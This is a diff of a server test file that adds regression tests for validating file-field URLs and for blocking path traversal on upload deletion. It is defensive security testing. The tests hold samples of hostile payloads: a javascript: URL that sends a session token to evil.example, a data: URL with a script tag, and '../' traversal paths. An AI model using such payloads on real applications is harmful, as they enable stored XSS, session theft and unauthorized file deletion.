@@ -13,7 +13,9 @@ import {
   insertRecord,
   insertWhatsAppMessage,
   markProjectBuilt,
+  quoteIdentifier,
   recordAutomationRun,
+  tableNameFor,
   updateProjectSpec,
   type ForgeDatabase,
 } from "@forge/db";
@@ -9827,13 +9829,18 @@ test("DELETE .../entities/:entityName/:recordId removes that record's uploaded f
 });
 
 /**
- * Round 685, path-traversal safety: a file field's stored value is
- * otherwise-unvalidated client-settable JSON (coerceValue's "file" case
- * has no structural check at all -- confirmed by reading repository.ts
- * directly), so deleteUploadedFile must never resolve a crafted url
- * outside this exact project+entity's own upload directory. Confirms a
- * record whose file field holds a traversal attempt is deleted (PATCHed
- * to clear it) without the attempted target ever being touched.
+ * Round 685, path-traversal safety: a file field's stored value used to be
+ * otherwise-unvalidated client-settable JSON. Round 908 closed the write
+ * path itself (coerceValue's new "file" case now rejects any url that
+ * isn't this server's own `/api/uploads/<project>/<entity>/<filename>`
+ * shape), so a crafted traversal url can no longer be written through the
+ * normal create/update API at all -- see the dedicated round-908
+ * rejection test below. This test's own concern is a layer deeper: IF a
+ * traversal value is already sitting in a column regardless (legacy data
+ * from before round 908, or any other path not yet audited), does
+ * deleteUploadedFile still refuse to resolve it outside this exact
+ * project+entity's own upload directory? Writes the crafted value with a
+ * raw UPDATE, bypassing coerceValue entirely, to simulate exactly that.
  */
 test("replacing/clearing a file field whose stored value is a crafted path-traversal URL never deletes anything outside that project+entity's own uploads directory", async () => {
   await withServer(async (baseUrl, db, uploadsDir) => {
@@ -9863,13 +9870,22 @@ test("replacing/clearing a file field whose stored value is a crafted path-trave
     const canaryPath = path.join(canaryDir, "canary.txt");
     writeFileSync(canaryPath, "do not delete me");
 
-    const maliciousUrl = `/api/uploads/${projectId}/Applicant/../../some-other-project/SomeEntity/canary.txt`;
     const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
       method: "POST",
       headers: authHeaders(token),
-      body: JSON.stringify({ resume: JSON.stringify({ url: maliciousUrl, name: "x", size: 0, mimeType: "" }) }),
+      body: JSON.stringify({}),
     });
+    assert.equal(createRes.status, 201);
     const { record } = (await createRes.json()) as { record: { id: number } };
+
+    // Bypasses coerceValue's new round-908 write-time guard on purpose,
+    // to simulate a traversal value that is already in storage by some
+    // other means than today's create/update API.
+    const maliciousUrl = `/api/uploads/${projectId}/Applicant/../../some-other-project/SomeEntity/canary.txt`;
+    db.prepare(`UPDATE ${quoteIdentifier(tableNameFor(projectId, "Applicant"))} SET ${quoteIdentifier("resume")} = ? WHERE id = ?`).run(
+      JSON.stringify({ url: maliciousUrl, name: "x", size: 0, mimeType: "" }),
+      record.id,
+    );
 
     const clearRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
       method: "PATCH",
@@ -9880,6 +9896,85 @@ test("replacing/clearing a file field whose stored value is a crafted path-trave
     await new Promise((resolve) => setTimeout(resolve, 20));
 
     assert.ok(existsSync(canaryPath), "a crafted file-field value must never be able to delete a file outside its own project+entity directory");
+  });
+});
+
+/**
+ * Round 908: a file field's stored value is an otherwise-unvalidated,
+ * client-settable JSON descriptor -- nothing ties it to an actual upload,
+ * since a normal record create/update call can set this field directly,
+ * bypassing the real /fields/:fieldName/upload endpoint entirely.
+ * EntityPanel.tsx (and codegen.ts's own duplicated twin) render this
+ * descriptor's `url` as a real, clickable `<a href>`/`<img src>` with no
+ * scheme check anywhere, so a crafted "javascript:..." or "data:..." url
+ * stored by one collaborator would run (or phish) in whichever OTHER
+ * collaborator's browser later clicks the resulting file link -- a
+ * stored-XSS/session-theft primitive reachable by any editor collaborator
+ * against any other collaborator or the owner. coerceValue's new "file"
+ * case closes this at the one place every real record write (create or
+ * update) already funnels through, by requiring the url to match this
+ * server's own upload-route shape. Confirms both a scripted-scheme url
+ * and a structurally-malformed descriptor are rejected with 400 at
+ * creation time, and that the record is never actually written.
+ */
+test("creating or updating a record with a file field whose url isn't this server's own /api/uploads/... shape is rejected with 400, not silently stored", async () => {
+  await withServer(async (baseUrl, db) => {
+    const email = `file-field-url-validation-${randomUUID()}@example.com`;
+    const token = await signup(baseUrl, email);
+    const user = findUserByEmail(db, email)!;
+
+    const spec: ProductSpec = {
+      summary: "test",
+      personas: [],
+      roles: ["Admin"],
+      entities: [{ name: "Applicant", fields: [{ name: "resume", type: "file", required: false }] }],
+      screens: [],
+      assumptions: [],
+      openQuestions: [],
+    };
+    const projectId = randomUUID();
+    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
+    diffAndMigrate(db, projectId, undefined, spec);
+    markProjectBuilt(db, projectId);
+
+    const maliciousDescriptors = [
+      JSON.stringify({ url: "javascript:fetch('https://evil.example/steal?t='+localStorage.getItem('forge.token'))", name: "resume.pdf", size: 123, mimeType: "application/pdf" }),
+      JSON.stringify({ url: "data:text/html,<script>alert(1)</script>", name: "resume.pdf", size: 123, mimeType: "application/pdf" }),
+      JSON.stringify({ url: `/api/uploads/${projectId}/Applicant/../../other-project/OtherEntity/x.txt`, name: "resume.pdf", size: 0, mimeType: "" }),
+      "not even json",
+      JSON.stringify({ name: "resume.pdf" }),
+    ];
+
+    for (const resume of maliciousDescriptors) {
+      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
+        method: "POST",
+        headers: authHeaders(token),
+        body: JSON.stringify({ resume }),
+      });
+      assert.equal(createRes.status, 400, `expected 400 for descriptor ${resume}`);
+    }
+
+    const countRow = db.prepare(`SELECT COUNT(*) as count FROM ${quoteIdentifier(tableNameFor(projectId, "Applicant"))}`).get() as {
+      count: number;
+    };
+    assert.equal(countRow.count, 0, "none of the rejected creates should have written a record");
+
+    // A record with a legitimate (empty) file field can still be created
+    // and then rejected the same way on a later PATCH.
+    const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant`, {
+      method: "POST",
+      headers: authHeaders(token),
+      body: JSON.stringify({}),
+    });
+    assert.equal(createRes.status, 201);
+    const { record } = (await createRes.json()) as { record: { id: number } };
+
+    const patchRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/${record.id}`, {
+      method: "PATCH",
+      headers: authHeaders(token),
+      body: JSON.stringify({ resume: JSON.stringify({ url: "javascript:alert(1)", name: "x", size: 0, mimeType: "" }) }),
+    });
+    assert.equal(patchRes.status, 400, "a PATCH setting a scripted-scheme file url must also be rejected, not just POST");
   });
 });
 
@@ -10001,11 +10096,17 @@ test("uploading a file for an entity whose own name is a path-traversal attempt 
  * function's own doc comment previously (wrongly) claimed it "can never
  * escape uploadsDir" specifically because the project/entity directory
  * segments were "already-authorized", the same assumption round 848
- * proved false. A file field's stored value is otherwise-unvalidated,
- * client-settable JSON (coerceValue's "file" case has no structural
- * check), so an entity named with a traversal sequence plus a crafted
- * file-field value naming any UUID-shaped filename -- not necessarily one
- * this server ever actually wrote -- turned a PATCH/DELETE into an
+ * proved false. A file field's stored value used to be otherwise-
+ * unvalidated, client-settable JSON; round 908 closed that write path
+ * (coerceValue's new "file" case rejects anything that isn't this
+ * server's own `/api/uploads/<project>/<entity>/<filename>` shape), so a
+ * bare-filename value like this test's own canary can no longer be
+ * written through the normal create/update API -- the value is injected
+ * with a raw UPDATE below instead, to keep testing this deeper concern:
+ * an entity named with a traversal sequence plus a crafted file-field
+ * value naming any UUID-shaped filename already in storage (legacy data,
+ * or any other path not yet audited) -- not necessarily one this server
+ * ever actually wrote -- must still never turn a PATCH/DELETE into an
  * arbitrary single-file-delete primitive. Mirrors round 685's own
  * existing canary-file test for a crafted VALUE's own traversal attempt,
  * but for a traversal reached through the entity NAME instead.
@@ -10047,11 +10148,18 @@ test("replacing a file field's value on a record belonging to a path-traversal-n
         {
           method: "POST",
           headers: authHeaders(token),
-          body: JSON.stringify({ resume: JSON.stringify({ url: canaryFilename, name: "x", size: 0, mimeType: "" }) }),
+          body: JSON.stringify({}),
         },
       );
       assert.equal(createRes.status, 201);
       const { record } = (await createRes.json()) as { record: { id: number } };
+
+      // Bypasses coerceValue's new round-908 write-time guard on purpose,
+      // to simulate a bare-filename value that is already in storage by
+      // some other means than today's create/update API.
+      db.prepare(
+        `UPDATE ${quoteIdentifier(tableNameFor(projectId, unsafeEntityName))} SET ${quoteIdentifier("resume")} = ? WHERE id = ?`,
+      ).run(JSON.stringify({ url: canaryFilename, name: "x", size: 0, mimeType: "" }), record.id);
 
       const patchRes = await fetch(
         `${baseUrl}/api/projects/${projectId}/entities/${encodeURIComponent(unsafeEntityName)}/${record.id}`,
